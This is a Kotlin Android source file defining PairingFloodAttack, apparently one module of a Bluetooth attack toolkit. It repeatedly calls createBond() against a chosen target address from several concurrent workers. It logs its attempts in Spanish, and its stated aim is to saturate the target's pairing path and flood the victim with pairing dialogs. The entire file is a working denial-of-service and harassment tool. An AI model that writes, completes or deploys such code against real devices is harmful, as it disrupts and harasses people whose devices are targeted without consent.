package api

import android.annotation.SuppressLint
import android.bluetooth.BluetoothManager
import android.content.Context
import androidx.core.content.ContextCompat.getSystemService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch

/**
 * Pairing Flood: sends a continuous stream of bond requests to the target.
 * Saturation of the pairing path + UI dialog spam when the user confirms.
 */
class PairingFloodAttack(
    private val targetAddress: String,
    private val threads: Int = 8,
    private val rateDelayMs: Int = 0
) : BluetoothAttack {

    override val displayName = AttackType.PAIRING_FLOOD.displayName
    override val description = AttackType.PAIRING_FLOOD.description

    private var scope: CoroutineScope? = null
    @Volatile
    private var running = false

    override fun isRunning() = running

    @SuppressLint("MissingPermission")
    override fun start(context: Context, onLog: (String) -> Unit) {
        if (running) return
        running = true
        val adapter = getSystemService(context, BluetoothManager::class.java)?.adapter
        if (adapter == null) {
            running = false
            return
        }
        val device = try {
            adapter.getRemoteDevice(targetAddress)
        } catch (e: IllegalArgumentException) {
            running = false
            return
        }

        // The stack serializes bond requests; more than 3 workers adds nothing.
        val concurrency = threads.coerceIn(1, 3)
        scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
        onLog("[PAIR] Pairing Flood iniciado (objetivo $targetAddress, $concurrency worker(s))")
        for (worker in 0 until concurrency) {
            scope!!.launch {
                var attempts = 0
                var round = 0
                while (isActive && running) {
                    val ok = try {
                        device.createBond()
                    } catch (e: SecurityException) {
                        false
                    }
                    if (ok) onLog("[PAIR] Solicitud de emparejamiento enviada (worker $worker)")
                    attempts++
                    if (attempts % 10 == 0) onLog("[PAIR] Intentos totales: $attempts")
                    round++
                    jitterDelay(maxOf(1200, rateDelayMs))
                }
            }
        }
    }

    override fun stop() {
        running = false
        scope?.cancel()
        scope = null
    }
}
